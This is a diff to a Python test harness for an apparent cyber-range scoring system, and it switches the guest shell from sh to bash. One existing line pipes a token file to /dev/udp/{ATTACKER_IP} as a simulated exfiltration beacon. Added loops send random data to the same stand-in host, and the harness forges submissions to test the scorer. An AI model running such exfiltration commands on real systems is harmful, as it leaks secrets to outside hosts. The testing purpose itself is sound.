@@ -170,8 +170,9 @@ def part_a() -> None:
 
 
 async def sh(oracle: RangeOracle, guest: str, command: str) -> int:
+    # bash, not sh: /dev/udp redirections are a bash feature (sh is dash here)
     outcome = await oracle.exec(
-        guest, ["sh", "-c", command], user="root", timeout_s=60.0
+        guest, ["bash", "-c", command], user="root", timeout_s=60.0
     )
     return outcome.rc
 
@@ -257,12 +258,16 @@ async def part_b() -> None:
             oracle, "web", f"cat /var/tmp/corr-token > /dev/udp/{ATTACKER_IP}/4455"
         )
         check(rc == 0, "B1: beacon emitted from web (token via UDP, path-only argv)")
+        # datagram-sized noise (a single multi-MB UDP write would EMSGSIZE):
+        # ~2.4 MB total forces rotation + ship at CAPTURE_CHUNK_MB=1
         rc = await sh(
             oracle,
             "web",
-            f"head -c 2200000 /dev/urandom > /dev/udp/{ATTACKER_IP}/4456",
+            "for i in $(seq 1 40); do "
+            f"head -c 60000 /dev/urandom > /dev/udp/{ATTACKER_IP}/4456; done",
         )
-        await asyncio.sleep(4.0)  # rotation + ship at CAPTURE_CHUNK_MB=1
+        check(rc == 0, "B1: rotation noise pushed across dmz")
+        await asyncio.sleep(4.0)
         store_one.set(
             SUBMISSIONS_STORE_KEY,
             [{"goal_id": "real", "value": token, "wall": time.time()}],
@@ -298,6 +303,17 @@ async def part_b() -> None:
             SUBMISSIONS_STORE_KEY,
             [{"goal_id": "forged", "value": token_two, "wall": time.time()}],
         )
+        # post-forge rotation noise: coverage must provably REACH the forged
+        # claim's wall, or the completeness rule (correctly) reads the claim
+        # as unverifiable instead of contradicted
+        rc = await sh(
+            oracle,
+            "web",
+            "for i in $(seq 1 40); do "
+            f"head -c 60000 /dev/urandom > /dev/udp/{ATTACKER_IP}/4457; done",
+        )
+        check(rc == 0, "B2: post-forge coverage noise pushed")
+        await asyncio.sleep(4.0)
         await asyncio.sleep(2.0)
         value, metadata = await score_challenge(
             oracle, store_two, challenge_two, submissions_for(store_two, challenge_two)
